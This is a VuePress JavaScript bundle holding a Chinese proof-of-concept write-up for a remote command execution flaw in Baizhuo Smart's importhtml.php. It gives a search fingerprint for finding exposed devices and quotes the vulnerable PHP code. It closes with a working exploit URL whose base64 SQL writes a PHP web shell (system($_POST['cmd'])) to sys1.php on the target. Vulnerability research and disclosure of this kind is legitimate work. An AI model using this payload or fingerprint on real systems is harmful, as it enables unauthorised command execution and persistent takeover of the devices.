import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const p={},e=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>百卓 importhtml.php文件sql语句无过滤，通过Sql语句可远程命令执行</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>百卓 Smart
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;Smart管理平台&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140918333.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件 <strong>importhtml.php</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;global.func.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;language&#39;</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string double-quoted-string">&quot;english&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">require_once</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;include/language_cn.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> 
<span class="token punctuation">{</span>
	<span class="token keyword">require_once</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;include/language_en.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;type&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$get_type</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;type&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tab&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$get_tab</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tab&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;sql&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$get_sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;sql&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$get_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;exporthtmlpost&quot;</span><span class="token punctuation">)</span>	
<span class="token punctuation">{</span>
	<span class="token variable">$get_tab</span> <span class="token operator">=</span> <span class="token variable">$arr_export_cn</span><span class="token punctuation">[</span><span class="token variable">$get_tab</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">exportHtml</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token variable">$get_tab</span></span>&quot;</span><span class="token punctuation">,</span><span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$get_sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$get_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;exporthtmlchat&quot;</span><span class="token punctuation">)</span>	
<span class="token punctuation">{</span>
	<span class="token variable">$get_tab</span> <span class="token operator">=</span> <span class="token variable">$arr_export_cn</span><span class="token punctuation">[</span><span class="token variable">$get_tab</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">exportHtmlChat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token variable">$get_tab</span></span>&quot;</span><span class="token punctuation">,</span><span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$get_sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$get_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;exporthtmlmail&quot;</span><span class="token punctuation">)</span>	
<span class="token punctuation">{</span>
	<span class="token variable">$get_tab</span> <span class="token operator">=</span> <span class="token variable">$arr_export_cn</span><span class="token punctuation">[</span><span class="token variable">$get_tab</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">exportHtmlMail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token variable">$get_tab</span></span>&quot;</span><span class="token punctuation">,</span><span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$get_sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$get_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;exporthtmlwebsend&quot;</span><span class="token punctuation">)</span>	
<span class="token punctuation">{</span>
	<span class="token variable">$get_tab</span> <span class="token operator">=</span> <span class="token variable">$arr_export_cn</span><span class="token punctuation">[</span><span class="token variable">$get_tab</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">exportHtmlWebSend</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token variable">$get_tab</span></span>&quot;</span><span class="token punctuation">,</span><span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$get_sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$get_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;exporthtmlwebrecv&quot;</span><span class="token punctuation">)</span>	
<span class="token punctuation">{</span>
	<span class="token variable">$get_tab</span> <span class="token operator">=</span> <span class="token variable">$arr_export_cn</span><span class="token punctuation">[</span><span class="token variable">$get_tab</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">exportHtmlWebRecv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token variable">$get_tab</span></span>&quot;</span><span class="token punctuation">,</span><span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$get_sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>跟踪exportHtmlMail函数</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">function</span> <span class="token function-definition function">exportHtmlMail</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

	<span class="token function">Header</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">&quot;Expires: 0&quot;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">Header</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">&quot;Pragma: public&quot;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">Header</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">&quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">Header</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">&quot;Cache-Control: public&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">Header</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">&quot;Content-Type: application/octet-stream&quot;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Accept-Ranges: bytes&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-Disposition: attachment; filename=<span class="token interpolation"><span class="token variable">$filename</span></span>.html&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;html&gt;\\n&quot;</span><span class="token punctuation">;</span>

	<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;head&gt;&lt;title&gt;报表&lt;/title&gt;&lt;/head&gt;\\n&quot;</span><span class="token punctuation">;</span>

	<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;body&gt;\\n&quot;</span><span class="token punctuation">;</span>

	<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">connOther</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

		<span class="token variable">$post_content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;mail_file_path&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;(null)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

			<span class="token variable">$post_content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;&lt;font color=red&gt;内容审计未启用&lt;/font&gt;&quot;</span><span class="token punctuation">;</span>

		<span class="token punctuation">}</span>

		<span class="token keyword">else</span><span class="token punctuation">{</span>



			<span class="token variable">$post_filename</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;mail_file_path&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

			<span class="token variable">$ifother</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">;</span>

			<span class="token variable">$ifother</span> <span class="token operator">=</span> <span class="token function">ifExistOther</span><span class="token punctuation">(</span><span class="token variable">$post_filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ifother</span><span class="token operator">!=</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

				<span class="token variable">$post_filename</span> <span class="token operator">=</span> <span class="token variable">$ifother</span><span class="token punctuation">;</span>

			<span class="token punctuation">}</span>

			<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;/usr/bin/cap2con <span class="token interpolation"><span class="token variable">$post_filename</span></span> pop&quot;</span><span class="token punctuation">;</span>

			<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$returnvalue</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token variable">$post_filename</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;.cap&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;.eml&quot;</span><span class="token punctuation">,</span><span class="token variable">$post_filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token variable">$post_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$post_filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token variable">$rec</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mime_decode</span><span class="token punctuation">;</span>

			<span class="token variable">$post_content</span><span class="token operator">=</span><span class="token variable">$rec</span><span class="token operator">-&gt;</span><span class="token function">decode_mime_string</span><span class="token punctuation">(</span><span class="token variable">$post_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">//...</span>

		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里可以发现通过base64解码后执行的Sql语句结果传入函数exportHtmlMail中调用system执行, 而 $post_filename 可控</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;/usr/bin/cap2con <span class="token interpolation"><span class="token variable">$post_filename</span></span> pop&quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>验证POC</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>https://xxx.xxx.xxx.xxx/importhtml.php?type=exporthtmlmail&amp;tab=tb_RCtrlLog&amp;sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>访问成功后会触发下载日志文件，再访问 sys1.php</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140919705.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,19),o=[e];function l(i,c){return s(),a("div",null,o)}const d=n(p,[["render",l],["__file","百卓 Smart importhtml.php 远程命令执行漏洞.html.vue"]]);export{d as default};
